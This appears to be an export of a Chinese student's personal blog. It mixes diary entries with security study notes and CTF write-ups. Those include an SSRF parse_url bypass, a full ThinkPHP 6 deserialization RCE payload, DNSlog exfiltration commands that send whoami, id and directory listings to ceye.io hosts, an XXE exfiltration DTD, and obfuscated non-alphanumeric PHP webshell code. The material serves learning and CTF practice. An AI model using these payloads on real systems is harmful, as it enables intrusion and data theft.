是两件事，第1个是C盘要备份哪些东西，第2个是预想一下我的以后的电脑的内容安排。\n今日六级单词：\n学习：149\n复习：144\n5.25\n西安雨天，闷热，无风。\n电脑坏了，修一晚上没好，难受。\nwindows11，开机之后反复白屏，资源管理器一直崩溃。可以关闭，关闭后就一直白屏。\n今日六级单词：\n学习：0\n复习：160\n5.24\n裂，早八的课，全宿舍九点半醒的，最重要的是还是管理学，啊啊啊。下节课有必要找老师谈谈了。\n管理学补偿计划：\n预先准备小礼品。\n今日六级单词：\n学习：120\n复习：184\n5.23\n当你想买一杯奶茶但是发现你已经连续买了三天的奶茶的时候。。。\n想了我在大学里学的第一个单词：\npursue\n给电脑清灰换硅脂，40，好便宜。\n然后做客旁边的海文考研唠嗑，四个人唠了一中午。\n找老师咨询科研项目的事，选了路由交换算法相关的理论领域，老师说先读些论文。不错，看来我得补补计网这块的内容还有图论。\n晚上终于把jsonp劫持看懂了，同源策略就差写.md嘞。\n睡前在想一个问题：霜之哀伤到底该对应什么啊？火之高兴？炎之腾跃？\n今日六级单词：\n学习：156\n复习：155\n5.22\n联系老师：\n成功客服社恐！\n食堂可乐事件：\n食堂点了份快餐，去楼下买杯豆浆回来后发现我的饭旁边多了瓶未开封的可乐。\n是哪个吧友让我帮着保管它吗，还是有人暗地送我可乐，亦或是有人认错饭啦？\n我只知道，最后直到我吃完饭，也没有人认领这瓶3.5的可口可乐。我计划去操场走几圈，如果回来的时候可乐还在的话，我就把它拿走卖给舍友。\n结果：走完圈往回宿舍了。\n蜜雪冰城加糖事件：\n两个妹子与蜜雪店员。\n妹子：不要糖。\n店员：不行，最少五五糖。\n妹子：我们不想加糖，可以不要吗？\n店员：不好意思我们这里有规定，糖最少要加到五五。\n妹子：额，你们这里是原料就是甜的还是后加的糖啊？\n店员：我们这里是单独加糖的。\n妹子：那你们就最后不放糖不就行了吗。\n店员（略有思考）：不行的，我们这里是全程监控的，必须按规定的来。\n妹子：。。。。。。\n雪顶咖啡到底该怎么喝：\n记得我第一次喝雪顶咖啡，那是前几天的一个阴云密布但仍然26°C的下午。我一边喝咖啡一边走圈背单词，一管到底，先苦后甜，冰淇淋只是糖和奶而已。\n今天我第二次喝雪顶咖啡，直接勺子开挖，先甜后苦，摩卡与冰淇淋完美融合，可惜最后只剩下咖啡与冰块。\n打算再喝的时候喝到一半，买个两块钱甜筒扣上去。\n脱单盲盒：\n一元留一个，一元取一个。\n新爱好：喝着蜜雪走圈背单词。\n今日六级单词：\n学习：155\n复习：97\n5.21\n爱死机第三季！给爷看！\n又去了一家考研机构咨询，又被放大了一次焦虑，好处是我对考研的印象越来越清晰，坏处是机构给你描述的场景实在是太美妙了，美妙到让你忘记三万块钱的意义。最后的结果就是产生了一种小孩子买不到玩具的心理。\n今日六级单词：\n学习：121\n复习：117\n5.20\n今天是520诶，参加了一个认识另一个我的活动，发现匹配到的是一个大四的学长，考上的西柚的研究生，当时怎么也没想到是这样一个展开。\n上午计划完美执行，10:43到食堂，发现肥牛金针菇没有开门，遂换成5个大包子。\n下午补了寻昼行动，夜半nb。\n晚上和网协的学妹聊天，好快啊。。她们都快独当一面了。每一次成长都来源于对困难的直面。\n今日六级单词：\n学习：147\n复习：91\n5.19\n上午塞罕坝精神\n下午奇趣蛋行动\n晚上被六级折磨\n普普通通的一天\n零号模拟系统启动，开始世界模拟：\n明天正常起，带洗澡用品，数电书，英语卷，穿拖鞋，戴口罩，做核酸，早饭，路上明日方舟，上课，不听讲课上写完数电作业，然后补昨天的阅读，写今天的阅读，下课直奔澡堂（记得洗澡时候放听力磨耳朵hhh开玩笑的），洗完到食堂大概在10：45，去美广买一份肥牛金针菇烤盘饭带走，回宿舍洗衣服，做听力，背单词，晾衣服，上床，再背单词，午觉。\n起床，先把英语任务做完，直奔网协，补同源策略。\n今日六级单词：\n学习：121\n复习：1\n5.18\n发现对面宿舍会根据我们宿舍是否锁门而选择是否逃课，但这里有个bug，因为我们宿舍并不只有电信的学生hhh。\n看同源策略，扯出jsonp和cors，又发现js看不懂，麻。\n英语啊英语，六级还有不到一个月啊，而我现在读个文章都费劲。\n提到这个就不得不想起考研的几科，顿时有种百废待兴的感觉。\n哈哈哈哈睡前宿舍讨论发现电信学的通原是C，没有期中考试。\n今日六级单词：\n学习：1\n复习：0\n5.17\n花了一下午时间，找机构老师聊了聊，简单了解了下考研，收获很大。\nemmmm流水账记着记着就感觉自己在记流水账诶，最近找个时间看看想写点啥长点的。最近好像也没咋做梦，突然想把梦境发出来，实在是很神奇。\n感觉自己个同源策略有仇一样。。。是不是因为太抽象了？\n5.15\n组团去吃湘菜，with2020安全组\u0026amp;党爷，体会到了，辣椒里找肉的感觉。\n5.14\n打出血热的疫苗，没吃早饭，穿的拖鞋，下雨，麻。\n晚上看薇尔莉特的电影版，见到少佐了，圆满。个人感觉，之前给观众展示的一直是薇尔莉特眼中的少佐，其实真实的少佐没有那么完美，从这些年一直在岛上自责与逃避就能体现出来。还有另一种看法，他自己选择了自己的路吧。\n5.13\n今天发现买的牛奶5.3过期，还剩好几袋扔了有点可惜。想起开学那天，舍友当着我的面喝了保质期1月份的牛奶然后啥事没有的壮举，抱着侥幸心理来了一袋。\n一个学生喝了一袋过期牛奶，这是他身体发生的变化。\nJ.Y is a 20 years old boy……\n学了手DNSlog注入，安了个Wappalyzer。\n读完这两篇之后感觉看了个电影\nhttps://www.freebuf.com/vuls/211842.html\t全程带阻：记一次授权网络攻防演练（上）\nhttps://www.freebuf.com/vuls/211847.html\t全程带阻：记一次授权网络攻防演练（下）\n下了个冰蝎3.0，打不开，一查是因为少个javafx库\nhttps://www.1024sou.com/article/741211.html\n5.11\n抽空看了《派对》和《辉夜3》\n派对最新一集的rap真的看入神了，一是我第一次看（听）这种形式的，二是孔明的说唱很魔性。\n“请随我们一同，用音乐实现天下太平吧。”\n转头来辉夜那集也是即兴说唱hhh\n","date":"2022-06-04T12:52:34+08:00","permalink":"https://proben1.github.io/2022/%E8%8C%84%E7%A7%91%E7%94%9F%E7%89%A9%E8%A7%82%E6%B5%8B%E6%97%A5%E5%BF%972022.5/","title":"茄科生物观测日志2022.5"},{"content":"可恶的win11更新，文件资源管理器打不开，打不开就重新打开，反复白屏。 系统坏了，就像是女朋友车祸失忆，还好身子没问题，无奈找学校良心师傅重装了个win10，30块。 先调账户，微软账户登录。 再用注册表把安全中心关了。 不要急着打游戏，先把显卡驱动给安上。再更新下其他驱动。 微软拼音卸载，绑定邮箱， 个性化：磁帖\n软件来重装，分了几类，装D盘里 A1：常用 QQ，微信，迅雷，搜狗，雷电模拟器，火绒，BANDIZIP，酷我，网易云，steam，epic，wegame，everything，WPS，腾讯会议 雷电：里面下明日方舟，微信，学习通\nA2：技术 python39，VScode，phpstudy，VM，Burpsuit，wireshark，matlab，jdk-16.0.2，ps，pr，git\nA3：其他 Clash.for.Windows https://nfblogs.com/cfw-cdn-mixin-tun-tap/#2Mixin-2 TranslucentTB（也可以从商店下载） 在根目录修改no-tray=enable\n配置Chrome，基本不用，登录上去全自动恢复了，单独设置一下SwitchyOmega\n没有gpedit.msc的话\n自动配置组策略编辑器 2022-4-3 135314 1\n@echo off pushd \u0026#34;%~dp0\u0026#34; dir /b C:\\Windows\\servicing\\Packages\\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum \u0026gt;List.txt dir /b C:\\Windows\\servicing\\Packages\\Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum \u0026gt;\u0026gt;List.txt for /f %%i in (\u0026#39;findstr /i . List.txt 2^\u0026gt;nul\u0026#39;) do dism /online /norestart /add-package:\u0026#34;C:\\Windows\\servicing\\Packages\\%%i\u0026#34; pause ","date":"2022-05-27T22:17:48+08:00","permalink":"https://proben1.github.io/2022/%E7%94%B5%E8%84%91%E9%87%8D%E8%A3%85/","title":"电脑重装"},{"content":"2022.5.22梦\n一觉起来，冷静了好多。\n做了一个很长的梦，梦见和zc在同一个学校，梦见半夜在大妈家偷偷打csgo，梦见大一的那些同学拿了个国一，梦见守林人出了个26源石的皮肤，梦见学校搬到了交界地，我从宿舍外远望是湖之波利维亚，可惜现在想想梦里没加载黄金树，还有好多大佬，我和他们在线上交流。。\n梦里的我有一种很清晰很清新的感觉，唯一的意义就是经历我大脑给出的场景。我想那个和我一样外表的梦中人到底是怎样的，他不会惋惜过去，不会烦恼将来，从现在发生的一切中去找到正面的情绪，这是因为我的期待，还是因为这就是我呢？\n","date":"2022-05-23T13:18:47+08:00","permalink":"https://proben1.github.io/2022/2022.5.22%E6%A2%A6/","title":"2022.5.22梦"},{"content":"source:http://121.36.145.157:8044/\n进去之后F12\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;欢迎挑战 Design by 香草\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!--phpinfo.php--\u0026gt; \u0026lt;img src=\u0026#34;url.php?url=https://ctf.pediy.com/upload/team/762/team236762.png\u0026#34;\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 提示了phpinfo，http://121.36.145.157:8044/phpinfo.php直接进去了，查到路径： /var/www/html；协议\nProtocols dict, file, ftp, ftps, gopher, http, https, imap, imaps, ldap, ldaps, pop3, pop3s, rtmp, rtsp, scp, sftp, smb, smbs, smtp, smtps, telnet, tftp 通过file协议查看源代码;\nhttp://121.36.145.157:8044/url.php?url=file://127.0.0.1/../../../../../../var/www/html/url.php\n\u0026lt;?php function curl_request($url, $data=null, $method=\u0026#39;get\u0026#39;, $header = array(\u0026#34;content-type: application/json\u0026#34;), $https=true, $timeout = 5){ $method = strtoupper($method); $ch = curl_init();//初始化 curl_setopt($ch, CURLOPT_URL, $url);//访问的URL curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);//只获取页面内容，但不输出 if($https){ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);//https请求 不验证证书 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);//https请求 不验证HOST } if ($method != \u0026#34;GET\u0026#34;) { if($method == \u0026#39;POST\u0026#39;){ curl_setopt($ch, CURLOPT_POST, true);//请求方式为post请求 } if ($method == \u0026#39;PUT\u0026#39; || strtoupper($method) == \u0026#39;DELETE\u0026#39;) { curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method); //设置请求方式 } curl_setopt($ch, CURLOPT_POSTFIELDS, $data);//请求数据 } curl_setopt($ch, CURLOPT_TIMEOUT, $timeout); curl_setopt($ch, CURLOPT_HTTPHEADER, $header); //模拟的header头 //curl_setopt($ch, CURLOPT_HEADER, false);//设置不需要头信息 $result = curl_exec($ch);//执行请求 curl_close($ch);//关闭curl，释放资源 return $result; } $url=$_GET[\u0026#34;url\u0026#34;]; $uu=parse_url($url); $host=isset($uu[\u0026#34;host\u0026#34;])?$uu[\u0026#34;host\u0026#34;]:\u0026#34;\u0026#34;; $scheme=isset($uu[\u0026#34;scheme\u0026#34;])?$uu[\u0026#34;scheme\u0026#34;]:\u0026#34;\u0026#34;; if(empty($host)){ die(\u0026#34;host is null\u0026#34;); } if(empty($scheme)){ die(\u0026#34;scheme is null\u0026#34;); } //https://ctf.pediy.com/upload/team/762/team236762.png? if($host==\u0026#34;ctf.pediy.com\u0026#34;||$host==\u0026#34;127.0.0.1\u0026#34;||$host==\u0026#34;localhost\u0026#34;){ //echo curl_request(\u0026#34;http://123.57.254.42/flag.php\u0026#34;,\u0026#34;get\u0026#34;,[],true,5);//get flag echo curl_request($url,\u0026#39;\u0026#39;,\u0026#34;get\u0026#34;,[],true,5); }else{ die(\u0026#34;host not allow\u0026#34;); } ?\u0026gt; 自定义了curl_request函数，但重点在parse_url上\n自己试l 一下：\n\u0026lt;?php #http://121.36.145.157:8044/url.php?url=123.57.254.42://localhost/../flag.php 先取出url $url=\u0026#34;123.57.254.42://localhost/../flag.php\u0026#34;; $uu=parse_url($url); echo $uu[\u0026#34;host\u0026#34;]; 输出是localhost\n然后用了浏览器试了试，当我们访问123.57.254.42://localhost/../flag.php，相当于访问123.57.254.42//flag.php，但是这个url被parse_url解析时，host会被定位为localhost，成功绕过。\npayload：\nhttp://121.36.145.157:8044/url.php?url=123.57.254.42://localhost/../flag.php flag{xxx_999()xx*@eeEEE}\n参考了下https://bbs.pediy.com/thread-272848.htm\n考察为基础的SSRF以及 php parse_url 和 curl 对 url 的解析规则不同。\n127.0.0.1://www.baidu.com 对于这种特殊的协议格式，就比较有意思 parse_url 识别的 host 为 www.baidu.com 但是 curl 请求会认为是 127.0.0.1,这就 可能导致问题，比如利用 parse_url 验证 host 是否为 127.0.0.1 这种内网 IP，然 后 用 curl 发 起 请 求 ， 就 可 能 等 导 致 ssrf 攻 击 。 比 如 ： 127.0.0.1://www.baidu.com/../index.php 这里得到的 host 是 www.baidu.com，但是 curl 实际访问的确是 127.0.0.1 666还有个很不错的思路，直接去搜出题人，发现会有浅谈 URL 协议 这篇文章，那答案八九不离十在里面。\n","date":"2022-05-18T20:05:12+08:00","permalink":"https://proben1.github.io/2022/kctf2022%E6%98%A5-4-%E9%A3%9E%E8%9B%BE%E6%89%91%E7%81%AB/","title":"KCTF2022春 4 飞蛾扑火"},{"content":"这篇文章负责解决一次面试题：\n简单的说一下同源策略 说说cors 和 jsonp分别是干什么的 为什么会出现这两个漏洞，以及如何进行修复 cors 和 jsonp 在修复过程中 token 是如何传递token的 cors如果是不允许的域发起了请求，cors会进行怎样的返回 jsonp的token跟在哪个位置 jsonp referr校验能否百分百防护吗 同源策略 同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。\n（emmmm其实刚学的时候纠结了好久这个东西）\n定义 协议/主机/端口\n与http://store.company.com/dir/page.html进行比较：\nURL 结果 原因 http://store.company.com/dir2/other.html 同源 只有路径不同 http://store.company.com/dir/inner/another.html 同源 只有路径不同 https://store.company.com/secure.html 失败 协议不同 http://store.company.com:81/dir/etc.html 失败 端口不同 ( http:// 默认端口是80) http://news.company.com/dir/other.html 失败 主机不同 JSONP 由于同源策略的存在，从别的域名（网站）那获取资料需要一个特殊的技术，即Jsonp(JSON with Padding)。Jsonp是 json 的一种\u0026quot;使用模式\u0026quot;，用于跨域读取数据。\n简单的说，就是动态创建\u0026lt;script\u0026gt;标签，然后利用\u0026lt;script\u0026gt;的src 不受同源策略约束来跨域获取数据。\nJSON劫持 JSON Hijacking，属于 CSRF（ Cross-site request forgery 跨站请求伪造）的范畴里。\n比如下面的链接在已登录的情况下会返回json格式的用户信息：\nhttp://login.xxx.com/userinfo 问题在于，攻击者伪造了一个虚假页面，并加入了如下标签：\n\u0026lt;script src=\u0026#34;http://login.xxx.com/userinfo\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 如果当前浏览器已经登录了test.com，并且cookie未过期，然后访问了攻击者的虚假页面，那么该页面就可以拿到json形式的用户敏感信息。\n又因为script标签会自动解析json数据，生成对应的js对象，然后再通过\nObject.prototype.__defineSetter__ 来触发自己的恶意代码……\n所以这个函数在当前的chrome和firefox中都失效了。\nJSONP劫持 Web安全学习笔记\n由浅入深理解JSONP并拓展\n","date":"2022-05-17T23:15:34+08:00","permalink":"https://proben1.github.io/2022/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/","title":"同源策略"},{"content":"DNSlog注入学习 前置 域名分级与域名解析过程(DNS)\n读完之后可以感受到，从用户到本地DNS服务器使用的是递归查询，递归的是本地DNS服务器帮你去迭代查询。\n其中，红色部分是可控的。我们只需要弄一个红色部分的DNS服务器，就得到DNS的解析日志。\n红色部分哪里来？自己搭建去（不一定），可以用下面的网站。\n网站 http://www.dnslog.cn/\nhttp://ceye.io/\n原理 DNS注入\n上面这些讲的很清楚，这里再用自己的话总结一下，就以Sql的利用为例子：\n在权限（文件可读）、环境（secure_file_priv）、长度（max_allowed_packet）都满足的情况下，在通过LOAD-FILE等文件函数进行读写时，整了个UCN路径，UCN路径构建DNS服务器地址，假装访问文件，产生DNSlog，就是这个DNSlog可以夹带私货，比如\nselect load_file(concat(\u0026rsquo;\\\\\u0026rsquo;,(select database()),\u0026rsquo;.xxxx.ceye.io\\abc\u0026rsquo;))\nUNC路径的理解（Universal Naming Convention）\n利用 使用DNSLOG拯救你的盲打盲注\nDNSLog在渗透中的使用\n1.SQL注入中的盲注 2.无回显的命令执行 Linux\nping `whoami`.xxxx.ceye.io curl http://haha.xxx.ceye.io/`whoami` 像这里还有复杂点的，base64，多行输出等等\ncurl http://xxx.dnslog.link/$(id|base64|tr \u0026#39;\\n\u0026#39; \u0026#39;-\u0026#39;) for i in $(ls /);do curl \u0026#34;http://$i.xxx.dnslog.link/\u0026#34;;done; Windows\nping %USERNAME%.xxx.ceye.io 这里也有复杂点的，其实都是配合命令行来\n获取计算机名：for /F \u0026#34;delims=\\\u0026#34; %i in (\u0026#39;whoami\u0026#39;) do ping -n 1 %i.xxx.dnslog.link 获取用户名：for /F \u0026#34;delims=\\ tokens=2\u0026#34; %i in (\u0026#39;whoami\u0026#39;) do ping -n 1 %i.xxx.dnslog.link 3.无回显SSRF 基本是把url换成想要的SSRF.xxxx.ceye.io\n4.XSS跨站 \u0026lt;script src=http://XSS.XXXXX.ceye.io\u0026gt;\u0026lt;/script\u0026gt; 5.XXE 改dtd：\n\u0026lt;!ENTITY % all \u0026#34;\u0026lt;!ENTITY % send SYSTEM \u0026#39;http://xxxx.ceye.io/%file;\u0026#39;\u0026gt;\u0026#34; \u0026gt; %all; Tips **为什么要使用DNS注入？**同学面试的时候被问过，原话是：除了上述这些（报错，盲注等）注入，sql注入有没有啥快速跑出来的方法？\n盲注跑数据太慢的情况下，可以选择DNS注入。\n","date":"2022-05-17T21:55:19+08:00","permalink":"https://proben1.github.io/2022/dnslog%E6%B3%A8%E5%85%A5/","title":"DNSlog注入"},{"content":"www.zip源码泄露，Thinkphp6.0，代码在app/controller/Index.php\n\u0026lt;?php namespace app\\controller; use app\\BaseController; class Index extends BaseController { public function index() { echo \u0026#34;\u0026lt;img src=\u0026#39;../test.jpg\u0026#39;\u0026#34;.\u0026#34;/\u0026gt;\u0026#34;; $paylaod = @$_GET[\u0026#39;payload\u0026#39;]; if(isset($paylaod)) { $url = parse_url($_SERVER[\u0026#39;REQUEST_URI\u0026#39;]); parse_str($url[\u0026#39;query\u0026#39;],$query); foreach($query as $value) { if(preg_match(\u0026#34;/^O/i\u0026#34;,$value)) { die(\u0026#39;STOP HACKING\u0026#39;); exit(); } } unserialize($paylaod); } } } parse_url()\n1.//upload?如果是//，则被解析成host, 后面的内容如果有/,被解析出path，而不是query了\n2.如果path部分为///，则解析错误\n工具：https://github.com/wh1t3p1g/phpggc\n使用：\n./phpggc -l ./phpggc -u ThinkPHP/RCE2 \u0026#39;system(\u0026#34;cat /flag\u0026#34;);\u0026#39; payload:\n///public/?payload=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3BN%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3BN%3Bs%3A18%3A%22%00think%5CModel%00force%22%3BN%3Bs%3A13%3A%22%00%2A%00connection%22%3BN%3Bs%3A9%3A%22%00%2A%00suffix%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00relation%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A10%3A%22%00%2A%00visible%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A200%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7Ds%3A8%3A%22function%22%3Bs%3A38%3A%22function+%28%29+use+%28%24code%29+%7Beval%28%24code%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3BN%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%220000000079ea1027000000003c8828b6%22%3B%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3BN%3B%7Ds%3A21%3A%22%00think%5CModel%00relation%22%3BN%3Bs%3A10%3A%22%00%2A%00visible%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3BN%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7D ","date":"2022-05-12T23:31:13+08:00","permalink":"https://proben1.github.io/2022/%E5%AE%89%E6%B4%B5%E6%9D%AF2019iamthinking/","title":"[安洵杯2019]iamthinking"},{"content":"php5中assert是一个函数，我们可以通过$f='assert';$f(...);这样的方法来动态执行任意代码。\n但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码.但也不是不行,也有其他的方法,比如file_put_contents这些函数\n所以这些都是用php5里的assert(),但是可以为php7.x版本提供思路\n下面,pass it!\n\u0026lt;?php if(!preg_match(\u0026#39;/[a-z0-9]/is\u0026#39;,$_GET[\u0026#39;shell\u0026#39;])) { eval($_GET[\u0026#39;shell\u0026#39;]); } 异或 \u0026lt;?php $_=(\u0026#39;%01\u0026#39;^\u0026#39;`\u0026#39;).(\u0026#39;%13\u0026#39;^\u0026#39;`\u0026#39;).(\u0026#39;%13\u0026#39;^\u0026#39;`\u0026#39;).(\u0026#39;%05\u0026#39;^\u0026#39;`\u0026#39;).(\u0026#39;%12\u0026#39;^\u0026#39;`\u0026#39;).(\u0026#39;%14\u0026#39;^\u0026#39;`\u0026#39;); // $_=\u0026#39;assert\u0026#39;; $__=\u0026#39;_\u0026#39;.(\u0026#39;%0D\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;%2F\u0026#39;^\u0026#39;`\u0026#39;).(\u0026#39;%0E\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;%09\u0026#39;^\u0026#39;]\u0026#39;); // $__=\u0026#39;_POST\u0026#39;; $___=$$__; $_($___[_]); // assert($_POST[_]); 取反 UTF-8编码的某个汉字，并将其中某个字符取出来，比如'和'{2}的结果是\u0026quot;\\x8c\u0026quot;，其取反即为字母s\n弱类型，true的值为1，故true+true==2，也就是('\u0026gt;'\u0026gt;'\u0026lt;')+('\u0026gt;'\u0026gt;'\u0026lt;')==2\n\u0026lt;?php $__=(\u0026#39;\u0026gt;\u0026#39;\u0026gt;\u0026#39;\u0026lt;\u0026#39;)+(\u0026#39;\u0026gt;\u0026#39;\u0026gt;\u0026#39;\u0026lt;\u0026#39;); $_=$__/$__; $____=\u0026#39;\u0026#39;; $___=\u0026#34;瞰\u0026#34;;$____.=~($___{$_});$___=\u0026#34;和\u0026#34;;$____.=~($___{$__});$___=\u0026#34;和\u0026#34;;$____.=~($___{$__});$___=\u0026#34;的\u0026#34;;$____.=~($___{$_});$___=\u0026#34;半\u0026#34;;$____.=~($___{$_});$___=\u0026#34;始\u0026#34;;$____.=~($___{$__}); $_____=\u0026#39;_\u0026#39;;$___=\u0026#34;俯\u0026#34;;$_____.=~($___{$__});$___=\u0026#34;瞰\u0026#34;;$_____.=~($___{$__});$___=\u0026#34;次\u0026#34;;$_____.=~($___{$_});$___=\u0026#34;站\u0026#34;;$_____.=~($___{$_}); $_=$$_____; $____($_[$__]); 寻找思路:找一篇长点的文章,写个脚本把里面的字挨个试一下,看通过截取并取反这个过程能不能得到字母\n\u0026lt;?php error_reporting(0); header(\u0026#39;Content-Type: text/html; charset=utf-8\u0026#39;); function str_split_unicode($str, $l = 0) { if ($l \u0026gt; 0) { $ret = array(); $len = mb_strlen($str, \u0026#34;UTF-8\u0026#34;); for ($i = 0; $i \u0026lt; $len; $i += $l) { $ret[] = mb_substr($str, $i, $l, \u0026#34;UTF-8\u0026#34;); } return $ret; } return preg_split(\u0026#34;//u\u0026#34;, $str, -1, PREG_SPLIT_NO_EMPTY); } $s = \u0026#39;当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之\u0026#39;; $arr_str=str_split_unicode($s); for ($i=0; $i \u0026lt; strlen($s) ; $i++) { echo $arr_str[$i].\u0026#39;--\u0026gt;\u0026#39;.~$arr_str[$i]{1}.\u0026#39;\u0026lt;br\u0026gt;\u0026#39;; } ?\u0026gt; 递增／递减 PHP 支持 C 风格的前／后递增与递减运算符。\n所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。\n数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。\n如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：\n\u0026lt;?php $_=[]; $_=@\u0026#34;$_\u0026#34;; // $_=\u0026#39;Array\u0026#39;; $_=$_[\u0026#39;!\u0026#39;==\u0026#39;@\u0026#39;]; // $_=$_[0]; $___=$_; // A $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__; // S $___.=$__; // S $__=$_; $__++;$__++;$__++;$__++; // E $___.=$__; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R $___.=$__; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T $___.=$__; $____=\u0026#39;_\u0026#39;; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P $____.=$__; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O $____.=$__; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S $____.=$__; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T $____.=$__; $_=$$____; $___($_[_]); // ASSERT($_POST[_]); php7动态函数 看来已经不足以阻挡了.加点难度\n\u0026lt;?php if(isset($_GET[\u0026#39;code\u0026#39;])){ $code = $_GET[\u0026#39;code\u0026#39;]; if(strlen($code)\u0026gt;35){ die(\u0026#34;Long.\u0026#34;); } if(preg_match(\u0026#34;/[A-Za-z0-9_$]+/\u0026#34;,$code)){ die(\u0026#34;NO.\u0026#34;); } eval($code); }else{ highlight_file(__FILE__); } pass it!\nPHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过('phpinfo')();来执行函数，第一个括号中可以是任意PHP表达式。\n最后,利用之前的取反,得到答案(phpinfo)\n(~%8F%97%8F%96%91%99%90)(); (上面url表示的都是abcd\u0026hellip;之外的不可见字符)\n回调函数 回调函数的运用在一段时间里曾被webshell广泛应用。\n首先，我们需要知道什么是回调函数，回调是什么意思？\n所谓是回调其实就是间接调用，当PHP调用用户自定义的函数时，必须要通过一个代理函数来进行调用，所以称为回调函数。\narray_walk() array_walk(array,myfunction,parameter...) 参数 描述 array 必需。规定数组。 myfunction 必需。用户自定义函数的名称。 userdata,… 可选。规定用户自定义函数的参数。您能够向此函数传递任意多参数。 \u0026lt;?php function 